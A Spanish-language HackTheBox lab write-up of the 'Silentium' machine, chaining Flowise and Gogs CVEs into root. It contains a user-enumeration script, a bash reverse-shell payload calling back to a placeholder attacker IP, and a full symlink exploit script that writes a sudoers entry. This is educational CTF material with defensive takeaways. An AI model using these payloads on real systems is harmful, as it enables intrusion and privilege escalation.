---
title: "Silentium"
date: 2026-06-24
categories: [HackTheBox, Easy]
tags: [linux, fuzzing, flowise, CVE, CVE-2025-58434, CVE-2025-59528, container escape, scripting, ssh port forward, gogs, symlink, sudoers]
image:
  path: /assets/img/HTB/Silentium/banner.png
  alt: Silentium writeup
protected: true
---


Tres CVE encadenadas y un escape de contenedor por reutilización de credenciales. Flowise 3.0.5 expone un oráculo de enumeración de usuarios que revela `ben@silentium.htb`; **CVE-2025-58434** (flujo de reseteo de contraseña roto) entrega esa cuenta; **CVE-2025-59528** (el nodo CustomMCP evalúa la entrada del usuario a través de `Function()`) da RCE como root dentro de un contenedor Docker. La reutilización de credenciales en `SMTP_PASSWORD` permite a `ben` entrar por SSH al host, y **CVE-2025-8110** (escritura arbitraria de archivos en Gogs vía symlink) — corriendo localmente como root y alcanzada a través de un port-forward — deposita una entrada de sudoers `NOPASSWD: ALL` para terminar como root.

| Campo      | Detalles            |
|------------|---------------------|
| Plataforma | HackTheBox          |
| Dificultad | Fácil               |
| SO         | Linux               |
| IP         | 10.129.30.173       |
| Fecha      | Junio 2026          |

## Herramientas utilizadas

| Herramienta                | Descripción                                                                                  |
|----------------------------|----------------------------------------------------------------------------------------------|
| nmap                       | Escáner de puertos e identificación de servicios                                            |
| gobuster (modo dns)        | Fuerza bruta de subdominios DNS contra la zona `silentium.htb`                              |
| Browser DevTools           | Análisis de la pestaña Network para descubrir endpoints de la API y oráculos por mensaje de error |
| Python3                    | Script de enumeración de usuarios a medida y exploit de Gogs                                 |
| curl                       | Explotación manual del endpoint RCE de CustomMCP de Flowise                                  |
| netcat (nc)                | Listener de reverse shell                                                                    |
| ssh (-L)                   | Port forward local para alcanzar la instancia interna de Gogs en el host                     |
| git                        | Requerido por el exploit de Gogs para hacer push del commit con el symlink malicioso         |

## Reconocimiento y enumeración

El objetivo de esta fase era enumerar los servicios expuestos e identificar el stack de aplicación que merecía la pena atacar.

### Descubrimiento del host

La conectividad se confirmó con ICMP. El TTL de 63 (el TTL por defecto en Linux es 64, decrementado una vez al cruzar el salto de enrutamiento) dio la pista habitual del SO:

```bash
ping -c 1 10.129.30.173
PING 10.129.30.173 (10.129.30.173) 56(84) bytes of data.
64 bytes from 10.129.30.173: icmp_seq=1 ttl=63 time=47.7 ms
```

### Escaneo de puertos

Un escaneo SYN sobre los 65535 puertos TCP a alta velocidad de paquetes, con `-Pn` saltando el descubrimiento de host y `-n` deshabilitando el DNS inverso:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.30.173 -oG allPorts
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Le siguió un escaneo dirigido con los scripts por defecto y detección de versiones:

```bash
sudo nmap -p22,80 -sCV 10.129.30.173 -oN nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
```

El servidor HTTP respondió con una redirección a `http://silentium.htb/`, señalando virtual hosting basado en nombre. El dominio se añadió al `/etc/hosts`:

```bash
echo "10.129.30.173 silentium.htb" | sudo tee -a /etc/hosts
```

### Aplicación web — callejón sin salida en el dominio principal

Navegar a `http://silentium.htb/` devolvió una landing page estática sin puntos de entrada evidentes: sin formulario de login, sin ruta de admin, sin banner de versión. El descubrimiento de contenido estándar (`gobuster dir`, `feroxbuster`) tampoco sacó nada. Con el dominio principal sin producir nada, el siguiente movimiento natural era asumir que la aplicación interesante estaba en un **subdominio** hermano.

### Enumeración de subdominios

`gobuster` en modo DNS itera un diccionario de subdominios contra el nameserver configurado, resolviendo cada candidato como `<word>.silentium.htb`:

```bash
sudo gobuster dns --domain silentium.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] Domain:     silentium.htb
[+] Threads:    10
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
staging.silentium.htb ::ffff:10.129.30.173
Progress: 1044 / 5000 (20.88%)^C
```

Un subdominio `staging.silentium.htb` resolvía a la misma IP. Añadido al `/etc/hosts`:

```bash
echo "10.129.30.173 staging.silentium.htb" | sudo tee -a /etc/hosts
```

### Identificando Flowise

`http://staging.silentium.htb/` redirigía a `/signin` y mostraba un formulario de login sin banner de versión evidente. El producto había que identificarlo a partir de señales secundarias. El HTML referenciaba un bundle JS versionado construido con Vite (`/assets/index-C6GKaUTA.js`), e inspeccionar el bundle reveló endpoints de la API bajo `/api/v1/...` con cadenas que pertenecían claramente a **Flowise**, el constructor de flujos LLM de código abierto.

Confirmar la versión exacta fue un one-liner contra un endpoint no autenticado expuesto por Flowise:

```bash
curl -s http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}
```

**Flowise 3.0.5** es la versión vulnerable más alta para dos problemas distintos armables como cadena:

- **CVE-2025-58434** — un flujo de reseteo de contraseña roto que devuelve un `tempToken` de un solo uso en línea en el cuerpo de la respuesta de `/api/v1/account/forgot-password`, lo que permite a cualquier atacante no autenticado tomar el control de cualquier cuenta registrada cuyo correo conozca.
- **CVE-2025-59528** — un fallo de ejecución de código en el nodo `CustomMCP` donde el campo `mcpServerConfig` se parsea pasando la cadena por el constructor `Function()` de JavaScript sin sanear, dando RCE bajo los privilegios del proceso Node.js.

El primero convierte *conocer un correo* en *toma de control total de la cuenta*; el segundo convierte *sesión autenticada* en *ejecución de código arbitrario*. La única pieza que faltaba era una dirección de correo válida.

## Explotación

### Enumeración de usuarios vía oráculo en la respuesta de login

Probar un correo aleatorio en el formulario de login produjo un error revelador:

![Sign-In page returning 'User Not Found' for non-existent accounts](/assets/img/HTB/Silentium/cap1.png)

El endpoint `POST /api/v1/auth/login` distingue entre *correo desconocido* y *contraseña incorrecta*. Enviar `test@test.com` devolvió `User Not Found`; un correo existente con una contraseña incorrecta presumiblemente devolvería algo como `Invalid Password`. Esa distinción es un **oráculo de enumeración de usuarios** clásico: una diferencia en el contenido de la respuesta entre *el usuario no existe* y *el usuario existe, credencial incorrecta* permite a un atacante iterar un diccionario y saber qué cuentas existen realmente en el sistema.

El login es basado en JSON, así que un pequeño script de Python usando `requests` es la herramienta correcta. Como los banners SMTP y las pistas de estilo FreePBX apuntaban todos a direcciones de correo bajo `@silentium.htb`, el script añade ese dominio a cada nombre de usuario candidato y se detiene en la primera respuesta que *no* contenga `User Not Found`:

```python
#!/usr/bin/env python3
import requests

TARGET = "http://staging.silentium.htb/api/v1/auth/login"
WORDLIST = "/usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt"


def make_request(session, word):
    word = word.strip()
    if not word:
        return None

    json_data = {
        "email": f"{word}@silentium.htb",
        "password": "test"
        }

    resp = session.post(TARGET, json=json_data, timeout=5)
    return resp

def is_valid(resp, word):
    if "User Not Found" not in resp.text:
        return True
    return False

def main():
    session = requests.Session()
    session.headers.update({
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    })

    with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f):
            word = line.strip()
            if not word:
                continue

            try:
                resp = make_request(session, word)

                if is_valid(resp, word):
                    print(f"    Valid User: {word}")
                    break

            except requests.RequestException as e:
                print(f"[-] Error en {word}: {e}")

if __name__ == "__main__":
    main()
```

Ejecutarlo contra `xato-net-10-million-usernames.txt` (uno de los diccionarios de nombres de usuario más comunes de SecLists, ordenado por frecuencia) encontró un acierto casi de inmediato:

```bash
python3 userEnum.py
    Valid User: ben
```

La primera cuenta válida fue **`ben`**, casi con seguridad resolviendo a `ben@silentium.htb`.

### CVE-2025-58434 — fuga del token de reseteo de contraseña

La PoC pública de `nltt0` explota el flujo de reseteo roto en dos peticiones. Primero llama a `POST /api/v1/account/forgot-password` con el correo objetivo; la versión vulnerable de Flowise devuelve el `tempToken` supuestamente privado en línea en el cuerpo de la respuesta JSON (en lugar de enviarlo por correo). Luego llama a `POST /api/v1/account/reset-password` con `email + tempToken + newPassword`, y Flowise aplica el cambio. Todo es de un solo disparo:

```bash
python3 exploit.py -e ben@silentium.htb -p ben -u http://staging.silentium.htb/

                by nltt0

[x] Password changed
```

Iniciar sesión por la UI web como `ben:ben` funcionó. El dashboard exponía varias funciones de admin de Flowise, incluida una sección de **API Keys** con una clave preexistente:

![Flowise admin panel showing the DefaultKey API key](/assets/img/HTB/Silentium/cap2.png)

```text
DefaultKey: hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc
```

### CVE-2025-59528 — RCE en CustomMCP vía constructor `Function()`

La segunda CVE de Flowise trata fundamentalmente de cómo el nodo `CustomMCP` parsea su configuración. El nodo recibe una cadena en `mcpServerConfig` que describe cómo conectarse a un servidor externo de Model Context Protocol, y Flowise necesita convertir esa cadena en un objeto JavaScript. El camino más corto entre *una cadena con aspecto de JavaScript* y *un objeto JavaScript* en Node es el **constructor `Function()`**, que compila su argumento como código fuente y devuelve un callable. La implementación vulnerable hace literalmente:

```javascript
new Function('return ' + inputString)()
```

…donde `inputString` es el `mcpServerConfig` proporcionado por el usuario. No hay sandboxing — la función construida corre en el mismo ámbito global de Node.js que el resto de Flowise, con acceso a `require`, `process`, el sistema de archivos y `child_process`. Cualquier cadena con aspecto de literal de objeto puede por tanto incrustar una IIFE que llame a `require('child_process').execSync(...)` como efecto secundario de "evaluar a un objeto".

El endpoint objetivo es `POST /api/v1/node-load-method/customMCP`. Dos detalles operativos importan:

- El endpoint requiere una sesión autenticada de Flowise, no solo la API key — así que el exploit necesita loguearse primero vía `/api/v1/auth/login` y reutilizar las cookies resultantes.
- El endpoint también comprueba la cabecera `x-request-from` y solo acepta peticiones que dicen venir de `internal`. Añadir `x-request-from: internal` a la petición satisface esta verificación trivial.

Se inició un listener de reverse shell:

```bash
nc -nlvp 5555
Listening on 0.0.0.0 5555
```

Luego se dirigió el login vía curl para capturar las cookies de sesión en un jar:

```bash
curl -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"ben"}' \
  -c /tmp/cookies.txt
```

El payload se preparó en un archivo JSON para evitar el infierno de escapado de comillas en la shell. La cadena pasada como `mcpServerConfig` es *sintácticamente* un literal de objeto `({x: ...})`, pero su único campo `x` se inicializa con una IIFE que llama a `child_process.execSync` para lanzar una reverse shell de bash de vuelta al listener — el efecto secundario es lo que gana:

```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require('child_process');cp.execSync('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1\"');return 1;})()})"
  }
}
```

Disparar la petición con las cookies capturadas y la cabecera de enrutamiento interno activó la conexión de vuelta:

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -b /tmp/cookies.txt \
  -d @/tmp/payload.json
```

El listener recibió una shell como `root` — o lo que parecía root. El puñado de procesos en ejecución y la disposición desconocida del sistema de archivos decían lo contrario.

## Escape de contenedor — reutilización de credenciales

Un listado de `ps` levantó sospechas de inmediato: la tabla de procesos contenía esencialmente solo el proceso Node de Flowise y la propia shell. Sin `systemd`, sin `cron`, sin demonio SSH. Combinado con lo que parecía un árbol de directorios Linux genérico, la señal era inconfundible — esto no era el host, era un **contenedor Docker**. El volcado de `env` lo confirmó:

```bash
env
FLOWISE_PASSWORD=F1l3_d0ck3r
HOSTNAME=c78c3cceb7ba
NODE_VERSION=20.19.4
SMTP_PORT=1025
HOME=/root
SENDER_EMAIL=ben@silentium.htb
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
[...]
```

Dos pistas clavan el contenedor:

- **`HOSTNAME=c78c3cceb7ba`** es una cadena hexadecimal de 12 caracteres — la forma corta canónica de un ID de contenedor Docker. Los hosts reales casi nunca tienen hostnames así.
- **`SMTP_HOST=mailhog`** apunta a un nombre de servicio interno que solo resuelve dentro de una red de Docker Compose.

El volcado de `env` también filtró un número inusual de secretos — claves de firma JWT, contraseñas de aplicación, credenciales SMTP. Dos de ellas parecían candidatas para reutilización de credenciales contra el servicio SSH del host:

- `FLOWISE_PASSWORD=F1l3_d0ck3r` — estilo juego de palabras, con sabor a aplicación.
- `SMTP_PASSWORD=r04D!!_R4ge` — leetspeak, genérica, muy de contraseña.

Probar la contraseña SMTP contra SSH como el usuario `ben` — elegido porque `FLOWISE_USERNAME=ben` y `SENDER_EMAIL=ben@silentium.htb` apuntaban ambos a esa cuenta — funcionó:

```bash
ssh ben@silentium.htb
ben@silentium.htb's password: r04D!!_R4ge
ben@silentium:~$
```

Este es el acceso inicial propiamente dicho: una shell en el host real, no en la instancia de Flowise contenerizada. La flag de usuario era legible desde el directorio home de `ben`:

```bash
cat /home/ben/user.txt
```

## Escalada de privilegios — `ben` → `root`

Con una shell como `ben` en el host, empezó la enumeración estándar. `sudo -l` no devolvió nada, no aparecieron anomalías SUID, y `find` sobre las rutas típicas escribibles por ben no produjo pistas usables. El avance llegó de `ps -aux`:

```bash
ps -aux | grep -i gogs
root     1496  0.0  1.7 1664680 69152 ?       Ssl  12:48   0:01 /opt/gogs/gogs/gogs web
```

**Gogs** — un servicio Git autoalojado — corría **como root**, lo que es en sí un error de configuración pero explica la oportunidad de escalada directamente. El banner de versión fijaba el build exacto:

```bash
/opt/gogs/gogs/gogs -v
Gogs version 0.13.3
```

Gogs 0.13.3 está afectado por **CVE-2025-8110**, una escritura arbitraria de archivos vía symlink que permite a cualquier usuario autenticado escribir en *cualquier* ruta a la que el proceso de Gogs pueda acceder — y como Gogs corre como root, eso significa en cualquier sitio del sistema de archivos.

### Localizando el listener de Gogs

El puerto web por defecto de Gogs es el 3000, pero una visita directa con el navegador a `http://silentium.htb:3000/` falló porque ningún puerto aparte del 22 y el 80 estaba expuesto externamente. `ss -nltp` desde la máquina reveló dónde estaba escuchando realmente Gogs:

```bash
ss -nltp
State    Recv-Q   Send-Q   Local Address:Port    Peer Address:Port
LISTEN   0        4096     127.0.0.1:1025        0.0.0.0:*
LISTEN   0        4096     127.0.0.1:8025        0.0.0.0:*
LISTEN   0        4096     127.0.0.1:42687       0.0.0.0:*
LISTEN   0        4096     127.0.0.1:3001        0.0.0.0:*
LISTEN   0        4096     127.0.0.1:3000        0.0.0.0:*
```

Dos candidatos estaban ligados a localhost — el 3000 y el 3001. El puerto 3000 resultó ser el puerto interno de Flowise (el contenedor hace reverse-proxy al 80 vía nginx), mientras que **el 3001 era la UI web de Gogs**. Ambos ligados solo a `127.0.0.1`, lo que significa que eran inalcanzables desde la red sin un túnel.

### Port forward local por SSH

`ssh -L` reenvía un puerto local de la máquina atacante a una dirección y puerto accesibles desde la perspectiva del servidor SSH. Apuntarlo a `127.0.0.1:3001` en el objetivo hace que Gogs sea accesible en el `127.0.0.1:8080` del atacante:

```bash
ssh -L 8080:127.0.0.1:3001 ben@silentium.htb -N
```

`-N` le dice a ssh que no ejecute ningún comando remoto — solo monta el forward y se mantiene vivo. Navegar a `http://127.0.0.1:8080/` desde la máquina atacante cargó la UI de Gogs directamente.

### Registro manual

Gogs está configurado para permitir el auto-registro. Se registró un usuario `monre` por la UI web (el captcha obliga a que este paso sea manual en lugar de scriptado) y se creó un nuevo repositorio bajo ese usuario:

![Gogs registration form](/assets/img/HTB/Silentium/cap3.png)

La vista del repo en Gogs confirmó algo útil para el exploit — la URL de clonado que muestra Gogs es `http://staging-v2-code.dev.silentium.htb`, lo que significa que el `ROOT_URL` de Gogs está configurado con ese hostname:

![Gogs repository view showing the configured ROOT_URL](/assets/img/HTB/Silentium/cap4.png)

Esa URL es lo que Gogs devuelve en las respuestas de la API (la respuesta al commit del exploit mostrará `staging-v2-code.dev.silentium.htb:3001` en el campo `commit.url`), pero el propio Gogs no aplica una comprobación de cabecera Host en las peticiones entrantes, así que el exploit puede apuntar directamente al `127.0.0.1:8080` tunelizado.

### CVE-2025-8110 — escritura arbitraria de archivos vía symlink

El fallo vive en cómo Gogs maneja las *actualizaciones* de archivos a través de su API REST. Cuando un archivo de un repositorio se actualiza vía `PUT /api/v1/repos/<owner>/<repo>/contents/<path>`, Gogs escribe el nuevo contenido en la ruta del sistema de archivos resuelta. Si el archivo bajo `<path>` es un **enlace simbólico**, Gogs sigue el enlace antes de escribir — lo que significa que la escritura aterriza en el destino del enlace en lugar de dentro del árbol de trabajo del repositorio. Combina eso con el hecho de que Gogs corre como root, y tienes una escritura arbitraria de archivos en cualquier ruta del sistema de archivos.

La PoC publicada por `zAbuQasem` escribe un archivo genérico; la modificación la adaptó para escribir un archivo drop-in de sudoers que concede a `ben` `NOPASSWD: ALL`. La cadena de pasos que realiza el script:

1. Loguearse como el usuario de Gogs recién registrado.
2. Generar un token de acceso a la API (Gogs requiere un token, no cookies de sesión, para la API de contenido de archivos).
3. Crear un repositorio vía la API.
4. Clonar el repo en local, añadir un **symlink** llamado `malicious_link` apuntando a `/etc/sudoers.d/ben`, commitear y hacer push.
5. Emitir un `PUT` a `/api/v1/repos/<user>/<repo>/contents/malicious_link` con una entrada de sudoers codificada en base64 como nuevo contenido. Gogs sigue el symlink mientras escribe, y el contenido aterriza en `/etc/sudoers.d/ben` — como root.

Script modificado completo:

```python
#!/usr/bin/env python3
"""
CVE-2025-8110 - Gogs Arbitrary File Write via symlink
Sin dependencias externas - solo stdlib + requests
"""

import argparse
import requests
import os
import subprocess
import shutil
import base64
import re
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings()

USERNAME = "monre"
PASSWORD = "monre123"
EMAIL = "monre@monre.com"
REPO = "monre"


def extract_csrf(html):
    match = re.search(r'<input[^>]+name="_csrf"[^>]+value="([^"]+)"', html)
    if not match:
        match = re.search(r'<input[^>]+value="([^"]+)"[^>]+name="_csrf"', html)
    if not match:
        raise ValueError("CSRF token not found")
    return match.group(1)

def login(session, base_url):
    url = f"{base_url}/user/login"
    resp = session.get(url)
    csrf = extract_csrf(resp.text)
    data = {
        "_csrf": csrf,
        "user_name": USERNAME,
        "password": PASSWORD,
    }
    resp = session.post(url, data=data, allow_redirects=True)
    if "user/login" in resp.url:
        raise ValueError("Login fallido")
    print("[+] Login correcto")


def get_token(session, base_url):
    url = f"{base_url}/user/settings/applications"
    resp = session.get(url)
    csrf = extract_csrf(resp.text)
    data = {"_csrf": csrf, "name": os.urandom(8).hex()}
    resp = session.post(url, data=data, allow_redirects=True)

    match = re.search(r'<div class="ui info message">\s*<p>([^<]+)</p>', resp.text)
    if not match:
        raise ValueError("Token no encontrado")
    token = match.group(1).strip()
    print(f"[+] Token: {token}")
    return token


def create_repo(session, base_url, token):
    api = f"{base_url}/api/v1/user/repos"
    data = {"name": REPO, "auto_init": True}
    resp = session.post(
        api,
        json=data,
        headers={"Authorization": f"token {token}"}
    )
    print(f"[+] Repo creado: {REPO} (status {resp.status_code})")


def upload_symlink(base_url):
    repo_dir = f"{REPO}"
    parsed = urlparse(base_url)
    clone_url = f"{parsed.scheme}://{USERNAME}:{PASSWORD}@{parsed.netloc}/{USERNAME}/{REPO}.git"

    if os.path.exists(repo_dir):
        shutil.rmtree(repo_dir)

    subprocess.run(["git", "clone", clone_url, repo_dir], check=True)

    # Symlink apunta a sudoers en la máquina víctima
    os.symlink("/etc/sudoers.d/ben", os.path.join(repo_dir, "malicious_link"))

    subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
    subprocess.run(["git", "commit", "-m", "Add symlink"], cwd=repo_dir, check=True)
    subprocess.run(["git", "push", "origin", "master"], cwd=repo_dir, check=True)
    print("[+] Symlink subido")


def exploit(session, base_url, token):
    # Payload: ben puede ejecutar sudo sin contraseña
    payload = "ben ALL=(ALL) NOPASSWD: ALL\n"
    api = f"{base_url}/api/v1/repos/{USERNAME}/{REPO}/contents/malicious_link"
    data = {
        "message": "exploit",
        "content": base64.b64encode(payload.encode()).decode(),
    }
    resp = session.put(
        api,
        json=data,
        headers={"Authorization": f"token {token}"},
    )
    print(f"[+] Exploit enviado (status {resp.status_code})")
    print(f"    Response: {resp.text[:200]}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="URL de Gogs (ej: http://127.0.0.1:8080)")
    args = parser.parse_args()

    session = requests.Session()
    session.verify = False

    login(session, args.url)
    token = get_token(session, args.url)
    create_repo(session, args.url, token)
    upload_symlink(args.url)
    exploit(session, args.url, token)

    print("\n[*] Ahora en la máquina HTB ejecuta:")
    print("    sudo su -")


if __name__ == "__main__":
    main()
```

Las dos decisiones de diseño no obvias en esta versión modificada son:

- **El destino del symlink es `/etc/sudoers.d/ben`, no `/etc/sudoers`.** Dejar un nuevo archivo en `/etc/sudoers.d/` es funcionalmente equivalente a extender `/etc/sudoers` (este último hace `@includedir` del primero) pero sortea la comprobación de sintaxis de `visudo` que `/etc/sudoers` ejecuta al editarse — una única línea malformada en el archivo sudoers maestro dejaría a todos fuera, mientras que un drop-in malformado se ignora silenciosamente.
- **El payload se envía como el nuevo contenido de la entrada `malicious_link` existente.** El symlink se commiteó en el paso 4 con un archivo de destino sin sentido, y luego el paso 5 lo *actualiza* vía la API. El seguimiento de symlinks de Gogs ocurre en la ruta de actualización, que es lo que la CVE explota — hacer push del contenido directamente vía git no lo activaría.

Ejecutando el script contra el túnel:

```bash
python3 privEsc.py -u http://127.0.0.1:8080
[+] Login correcto
[+] Token: 59f093d7e27a704917374aa051442b0be48a6788
[+] Repo creado: monre (status 422)
Clonando en '/tmp/monre'...
[master 2041c0e] Add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
[...]
To http://127.0.0.1:8080/monre/monre.git
   c0dd920..2041c0e  master -> master
[+] Symlink subido
[+] Exploit enviado (status 201)
    Response: {"commit":{"url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/monre/monre/contents/malicious_link",...}

[*] Ahora en la máquina HTB ejecuta:
    sudo su -
```

El estado `201 Created` confirma que Gogs escribió el nuevo contenido del archivo — que, por el symlink, aterrizó en `/etc/sudoers.d/ben`. El `commit.url` en la respuesta muestra `staging-v2-code.dev.silentium.htb:3001` porque Gogs construye las URLs de respuesta a partir de su `ROOT_URL` configurado, no de la cabecera Host de la petición. El estado `422` de `create_repo` es benigno — significa que el repo ya existía de una ejecución anterior, y el script continúa de forma idempotente.

De vuelta en la sesión SSH del host, `sudo` ahora acepta la escalada de privilegios previamente rechazada sin pedir contraseña:

```bash
sudo su -
root@silentium:~# cat /root/root.txt
```

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Conclusiones clave

- **Las diferencias en el texto de la respuesta son oráculos.** Un formulario de login que dice `User Not Found` para correos desconocidos y otra cosa para correos conocidos está filtrando la validez de cada correo que un atacante envía. La solución son respuestas universales del tipo "correo o contraseña inválidos" — y un manejo con tiempos igualados en el backend, porque incluso cuando el mensaje es genérico, una diferencia de tiempo medible entre *se ejecutó bcrypt* y *se saltó bcrypt* filtra el mismo bit.
- **`new Function(userInput)` es `eval()` con pasos extra.** Cualquier ruta de código que compila datos controlados por el usuario en JavaScript y los ejecuta es una ejecución remota de código esperando a ocurrir, por inocua que sea la forma *prevista* de los datos. El parseo de JSON tiene `JSON.parse` por algo. CVE-2025-59528 es el ejemplo de manual del mismo anti-patrón que ha producido RCEs en incontables motores de plantillas, cargadores de configuración y cadenas de filtros de ORM a lo largo de los años.
- **`env` es la primera parada tras cualquier RCE.** Los entornos de contenedor meten secretos en variables de entorno por comodidad de despliegue, lo que significa que lo primerísimo que un atacante debería hacer tras conseguir ejecución de código en un contenedor es volcar `env`. Claves de firma JWT, credenciales de base de datos, contraseñas SMTP, tokens de API internos, claves de acceso de proveedores cloud — todo acaba ahí, y la reutilización de credenciales contra el servicio SSH del host es el pivote contenedor-a-host más fácil disponible.
- **Los puertos de servicio ligados a localhost son alcanzables a través de cualquier sesión SSH.** `ssh -L` hace que un puerto interno "privado" sea indistinguible de uno público en lo que a las herramientas de explotación respecta. La lección para los defensores es que "solo localhost" no es un control de seguridad para ningún usuario que ya tenga SSH en el host — solo ralentiza al atacante un minuto.
- **Los symlinks siguen siendo una primitiva de escritura en el sistema de archivos excepcionalmente efectiva.** CVE-2025-8110 es la última de una larga lista de CVE del tipo "X sigue symlinks cuando no debería" (tarfile/CVE-2025-4517, el zipfile de Python, cada race de `/tmp` compartido) precisamente porque la abstracción tiene fugas: el código que razona en términos de "nombres de archivo" casi siempre se refiere a "el contenido del archivo en ese nombre", y el SO no distingue una escritura a través de symlink de una escritura directa en la capa de syscall. El código que maneja rutas controladas por el usuario debería resolverlas siempre con `O_NOFOLLOW` o equivalente antes de escribir.
